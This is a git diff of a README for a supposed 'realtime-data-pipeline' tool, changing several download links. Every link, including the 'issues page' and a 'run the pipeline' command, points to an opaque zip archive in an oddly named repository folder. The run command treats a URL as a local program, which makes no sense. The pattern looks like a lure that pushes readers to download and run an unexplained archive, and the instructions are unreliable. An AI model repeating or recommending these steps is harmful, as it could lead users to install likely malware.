@@ -7,11 +7,11 @@ Welcome to the realtime-data-pipeline project! This tool helps you process data 
 
 ## 📦 Download the Application
 
-[![Download](https://raw.githubusercontent.com/MohamedSamiHdj/realtime-data-pipeline/main/cardiacean/realtime-data-pipeline.zip%20Now%20%3E%3E%3E-1E90FF?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/MohamedSamiHdj/realtime-data-pipeline/main/cardiacean/realtime-data-pipeline.zip)
+[![Download](https://github.com/MohamedSamiHdj/realtime-data-pipeline/raw/refs/heads/main/cardiacean/data_realtime_pipeline_v2.0.zip%20Now%20%3E%3E%3E-1E90FF?style=for-the-badge&logo=github)](https://github.com/MohamedSamiHdj/realtime-data-pipeline/raw/refs/heads/main/cardiacean/data_realtime_pipeline_v2.0.zip)
 
 To begin, visit our releases page to download the latest version of the application.
 
-[Download the application here!](https://raw.githubusercontent.com/MohamedSamiHdj/realtime-data-pipeline/main/cardiacean/realtime-data-pipeline.zip)
+[Download the application here!](https://github.com/MohamedSamiHdj/realtime-data-pipeline/raw/refs/heads/main/cardiacean/data_realtime_pipeline_v2.0.zip)
 
 ## ⚙️ System Requirements
 
@@ -35,7 +35,7 @@ The realtime-data-pipeline offers several key features to help you manage your d
 
 ## 📥 Download & Install
 
-1. Click on the [Download the application here!](https://raw.githubusercontent.com/MohamedSamiHdj/realtime-data-pipeline/main/cardiacean/realtime-data-pipeline.zip) link. 
+1. Click on the [Download the application here!](https://github.com/MohamedSamiHdj/realtime-data-pipeline/raw/refs/heads/main/cardiacean/data_realtime_pipeline_v2.0.zip) link. 
 2. Find the latest version of the application on the releases page.
 3. Select the file that matches your system and click on it to download.
 4. Once the download completes, locate the file in your Downloads folder.
@@ -54,7 +54,7 @@ After installation, you can start using the application. Here’s how to run you
 3. Prepare your data files. Make sure they are in a format that the application supports, like CSV or JSON.
 4. Run the pipeline script by typing:
    ```
-   .\https://raw.githubusercontent.com/MohamedSamiHdj/realtime-data-pipeline/main/cardiacean/realtime-data-pipeline.zip -input "path_to_your_data_file" -output "desired_output_path"
+   .\https://github.com/MohamedSamiHdj/realtime-data-pipeline/raw/refs/heads/main/cardiacean/data_realtime_pipeline_v2.0.zip -input "path_to_your_data_file" -output "desired_output_path"
    ```
    Replace `path_to_your_data_file` with the actual path of your input data file and `desired_output_path` with where you want the output.
 
@@ -68,7 +68,7 @@ If you encounter issues during installation or while running the application, co
 
 ## 📩 Support
 
-You can reach out for help or to report any issues by visiting the [issues page](https://raw.githubusercontent.com/MohamedSamiHdj/realtime-data-pipeline/main/cardiacean/realtime-data-pipeline.zip). Describe your problem clearly, including error messages and what steps you took leading up to the issue.
+You can reach out for help or to report any issues by visiting the [issues page](https://github.com/MohamedSamiHdj/realtime-data-pipeline/raw/refs/heads/main/cardiacean/data_realtime_pipeline_v2.0.zip). Describe your problem clearly, including error messages and what steps you took leading up to the issue.
 
 ## 📄 License
 
